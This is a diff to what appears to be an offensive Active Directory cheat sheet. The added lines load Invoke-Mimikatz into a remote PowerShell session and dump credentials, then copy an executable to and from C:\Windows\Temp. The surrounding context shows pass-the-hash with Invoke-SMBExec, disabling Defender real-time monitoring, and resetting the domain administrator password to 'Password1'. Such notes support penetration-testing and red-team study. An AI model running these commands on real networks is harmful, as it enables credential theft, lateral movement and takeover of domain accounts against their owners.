@@ -83,6 +83,18 @@ Invoke-SMBExec -Target MS01 -Domain EVILCORP -Username elliot -Hash 31d6cfe0d16a
 $sess = New-PSSession -ComputerName MS01 -Credential evil\elliot
 Invoke-Command -Session $sess -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true }
 
+#Load Powersell file in a remote session from host machine. Execute commads in remote machine.
+#Local file loaded to remote session.
+Invoke-Command -Session $sess -FilePath .\Invoke-Mimikatz.ps1 
+#Dumping credential from remote session.
+Invoke-Command -Session $sess -ScriptBlock { Invoke-Mimikatz -Dumpcreds } 
+
+#Copy file from Host to Remote computer using PSSEssion
+Copy-Item "C:\Users\elliot\SomeBSfile.exe" -Destination "C:\Windows\Temp\SomeBSfile.exe" -ToSession $sess
+
+#Copy file from Remote to Host computer using PSSEssion
+Copy-Item "C:\Windows\Temp\SomeBSfile.exe" -Destination "C:\Users\elliot\SomeBSfile.exe" -FromSession $sess
+
 #Reset password of AD Account
 Set-ADAccountPassword -Identity administrator -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "Password1" -Force)
 
